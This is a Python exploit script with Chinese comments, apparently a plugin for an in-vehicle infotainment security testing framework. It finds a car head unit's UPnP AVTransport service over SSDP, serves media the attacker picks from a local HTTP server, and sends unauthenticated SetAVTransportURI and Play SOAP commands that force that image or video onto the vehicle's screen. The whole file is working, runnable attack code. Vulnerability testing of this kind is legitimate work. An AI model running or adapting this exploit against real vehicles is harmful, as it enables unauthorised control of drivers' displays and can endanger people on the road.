"""
PoC Name: Mirror Hijack (UPnP AVTransport)
CVE: N/A
Component: Application Stack / UPnP
Category: Application
Severity: High
CVSS: 7.5
Description: 利用 SSDP 发现 IVI 系统的 AVTransport 服务，通过未授权指令强制车机屏幕显示攻击者指定的图片/视频。
Prerequisites: 与目标车机处于同一局域网。
Usage: python3 13_Mirror_Hijack.py <target_ip>
"""
import socket
import requests
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
import threading
import time
import os
import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin

class MirrorHijackPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-013"
    """
    Mirror Hijack (UPnP AVTransport) Exploit Plugin
    
    基于用户提供的脚本，实现自动发现、建立本地 HTTP 回连服务
    并发送 SetAVTransportURI + Play 指令。
    """
    meta_poc_name = "Mirror Hijack"
    meta_cve_id = "N/A"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    
    LOCAL_PORT = 8000
    FILE_NAME = "media.mp4" # 媒体文件名

    def __init__(self, target_config, logger=None, media_file=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-Mirror-Hijack"
        self.results["description"] = "通过 UPnP AVTransport 接口强制车机显示媒体 (Mirror Hijack)"
        self.httpd = None
        self.media_file = media_file
        self.media_content = None
        self.media_type = "video/mp4"

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标 IP")
        return None  # type: ignore

    def _load_media_file(self):
        """加载媒体文件"""
        if self.media_file and os.path.isfile(self.media_file):
            self.logger.info(f"[*] 加载媒体文件: {self.media_file}")
            with open(self.media_file, 'rb') as f:
                self.media_content = f.read()
            
            # 判断媒体类型
            if self.media_file.lower().endswith(('.jpg', '.jpeg')):
                self.media_type = "image/jpeg"
                self.FILE_NAME = "image.jpg"
            elif self.media_file.lower().endswith('.png'):
                self.media_type = "image/png"
                self.FILE_NAME = "image.png"
            elif self.media_file.lower().endswith(('.mp4', '.m4v')):
                self.media_type = "video/mp4"
                self.FILE_NAME = "video.mp4"
            elif self.media_file.lower().endswith('.mov'):
                self.media_type = "video/quicktime"
                self.FILE_NAME = "video.mov"
            
            self.logger.info(f"[*] 媒体类型: {self.media_type}, 大小: {len(self.media_content)} 字节")
            return True
        else:
            self.logger.warning(f"[!] 媒体文件不存在或未指定: {self.media_file}")
            return False

    def _start_http_server(self):
        try:
            media_content = self.media_content or b''
            media_type = self.media_type
            logger = self.logger
            
            class MediaHandler(SimpleHTTPRequestHandler):
                def do_GET(self):
                    if 'media' in self.path.lower() or 'image' in self.path.lower() or 'video' in self.path.lower():
                        # 提供媒体内容
                        self.send_response(200)
                        self.send_header('Content-Type', media_type)
                        self.send_header('Content-Length', str(len(media_content)))
                        self.send_header('Connection', 'close')
                        self.end_headers()
                        self.wfile.write(media_content)
                        logger.info(f"[+] 已向目标发送媒体 ({len(media_content)} 字节)")
                    else:
                        self.send_response(404)
                        self.end_headers()
                
                def log_message(self, format, *args):
                    pass  # 静默
            
            self.httpd = HTTPServer(("0.0.0.0", self.LOCAL_PORT), MediaHandler)
            self.logger.info(f"[HTTP] 媒体服务器已启动，端口 {self.LOCAL_PORT}")
            t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            t.start()
            return True
        except Exception as e:
            self.logger.error(f"启动媒体服务器失败: {e}")
            return False

    def _discover_location(self):
        msg = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: 239.255.255.250:1900',
            'MAN: "ssdp:discover"',
            'MX: 2',
            'ST: urn:schemas-upnp-org:service:AVTransport:1',
            '', ''
        ]).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/6] 发送 SSDP 发现请求...")
        
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start_time = time.time()
            while time.time() - start_time < 5:
                try:
                    data, addr = sock.recvfrom(65507)
                    if addr[0] == self.target_ip and b"LOCATION:" in data.upper():
                        for line in data.decode(errors='ignore').split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                loc = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现目标 LOCATION: {loc}")
                                return loc
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 发现异常: {e}")
        finally:
            sock.close()
        return None

    def _generate_upnp_metadata(self, media_url):
        """生成标准的 UPnP DIDL-Lite 元数据"""
        # 判断媒体类型，生成对应的元数据
        mime_type = self.media_type
        if mime_type == "image/jpeg":
            upnp_class = "object.item.imageItem.photo"
        elif mime_type == "image/png":
            upnp_class = "object.item.imageItem.photo"
        else:
            upnp_class = "object.item.videoItem.movie"
        
        # 完整的 DIDL-Lite 元数据（XML 转义）
        didl_lite = f'''&lt;DIDL-Lite xmlns=&quot;urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/&quot; xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot; xmlns:upnp=&quot;urn:schemas-upnp-org:metadata-1-0/upnp/&quot;&gt;&lt;item id=&quot;0&quot; parentID=&quot;-1&quot; restricted=&quot;0&quot;&gt;&lt;dc:title&gt;Streaming Media&lt;/dc:title&gt;&lt;dc:creator&gt;System&lt;/dc:creator&gt;&lt;upnp:class&gt;{upnp_class}&lt;/upnp:class&gt;&lt;res protocolInfo=&quot;http-get:*:{mime_type}:*&quot;&gt;{media_url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;'''
        return didl_lite

    def _get_control_url(self, location_url):
        try:
            resp = requests.get(location_url, timeout=5)
            xml_root = ET.fromstring(resp.content)
            ns = {"urn": "urn:schemas-upnp-org:device-1-0"}
            for service in xml_root.findall(".//urn:service", ns):
                service_type_elem = service.find("urn:serviceType", ns)
                control_url_elem = service.find("urn:controlURL", ns)
                
                if service_type_elem is not None and control_url_elem is not None:
                    service_type = service_type_elem.text or ""
                    if "AVTransport" in service_type:
                        control_url = control_url_elem.text or ""
                        full_url = urljoin(location_url, control_url)
                        self.logger.info(f"[2/6] 解析控制 URL: {full_url}")
                        return full_url
        except Exception as e:
            self.logger.error(f"解析控制 URL 失败: {e}")
        return None

    def exploit(self):
        # 0. 加载媒体文件
        if not self._load_media_file():
            self.logger.error("[-] 无法加载媒体文件")
            return
        
        # 1. 发现
        location = self._discover_location()
        if not location:
            self.logger.warning("未发现目标 AVTransport 服务")
            return

        # 2. 控制 URL
        ctrl_url = self._get_control_url(location)
        if not ctrl_url:
            return

        # 3. 启动媒体服务
        self._start_http_server()
        time.sleep(0.5)  # 确保服务器启动
        
        # 获取本机 IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"

        file_url = f"http://{local_ip}:{self.LOCAL_PORT}/{self.FILE_NAME}"
        self.logger.info(f"[3/6] 构造媒体 URL: {file_url}")

        # 4. 生成完整的 UPnP 元数据（DIDL-Lite 格式）
        upnp_metadata = self._generate_upnp_metadata(file_url)
        self.logger.info(f"[*] 生成 UPnP 元数据")

        # 5. SOAP 指令
        headers = {
            "Content-Type": 'text/xml; charset="utf-8"',
            "Connection": "close",
        }
        
        # SetAVTransportURI - 带完整元数据
        set_uri_soap = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID>
<CurrentURI>{file_url}</CurrentURI>
<CurrentURIMetaData>{upnp_metadata}</CurrentURIMetaData>
</u:SetAVTransportURI>
</s:Body>
</s:Envelope>"""
        headers["SOAPAction"] = '"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"'
        self.logger.info("[4/6] 发送 SetAVTransportURI...")
        try:
            r1 = requests.post(ctrl_url, data=set_uri_soap.encode('utf-8'), headers=headers, timeout=8)
            self.logger.info(f"SetAVTransportURI 响应: HTTP {r1.status_code}")
            if r1.status_code != 200:
                self.logger.debug(f"响应体: {r1.text[:500]}")
        except Exception as e:
            self.logger.error(f"SetAVTransportURI 发送失败: {e}")
            r1 = None

        time.sleep(0.5)
        
        # Play
        play_soap = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>0</InstanceID>
<Speed>1</Speed>
</u:Play>
</s:Body>
</s:Envelope>"""
        headers["SOAPAction"] = '"urn:schemas-upnp-org:service:AVTransport:1#Play"'
        self.logger.info("[5/6] 发送 Play...")
        try:
            r2 = requests.post(ctrl_url, data=play_soap.encode('utf-8'), headers=headers, timeout=8)
            self.logger.info(f"Play 响应: HTTP {r2.status_code}")
            if r2.status_code != 200:
                self.logger.debug(f"响应体: {r2.text[:500]}")
        except Exception as e:
            self.logger.error(f"Play 发送失败: {e}")
            r2 = None

        # 6. 结论
        time.sleep(1)
        if r1 is not None and r2 is not None:
            if r1.status_code == 200 and r2.status_code == 200:
                self.results["vulnerable"] = True
                self.results["evidence"] = f"Media Injection Success: Injected {self.media_type} to {self.target_ip}"
                self.logger.warning(f"[!] 【成功】媒体注入成功！URL: {file_url}")
            elif r1.status_code == 200:
                self.results["vulnerable"] = True
                self.results["evidence"] = f"SetAVTransportURI accepted (200), but Play returned {r2.status_code}"
                self.logger.warning(f"[!] 【部分成功】SetAVTransportURI 接受，但 Play 返回 {r2.status_code}")
                self.logger.info("[*] 提示：可能需要额外的参数或指令顺序调整")
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = f"SetURI Status: {r1.status_code}, Play Status: {r2.status_code}"
                self.logger.warning(f"[-] 【失败】操作被拒绝 - SetURI: {r1.status_code}, Play: {r2.status_code}")
                self.logger.info("[*] 诊断提示：")
                self.logger.info(f"    - 检查是否需要特定的元数据格式")
                self.logger.info(f"    - 尝试不同的媒体类型")
                self.logger.info(f"    - 检查是否需要 AVTransport:2 而非 AVTransport:1")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = "Network communication failed"
            self.logger.error("[-] 网络通信失败")

        if self.httpd:
            self.httpd.shutdown()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 13_Mirror_Hijack.py <target_ip> [--media <path>]")
        print("  target_ip:  目标车机 IP")
        print("  --media:    媒体文件路径 (.mp4, .jpg, .png, .mov)")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    media_file = None
    
    # 解析 --media 参数
    if "--media" in sys.argv:
        idx = sys.argv.index("--media")
        if idx + 1 < len(sys.argv):
            media_file = sys.argv[idx + 1]
    
    plugin = MirrorHijackPlugin({"target_ip": target_ip}, media_file=media_file)
    plugin.run_verify()
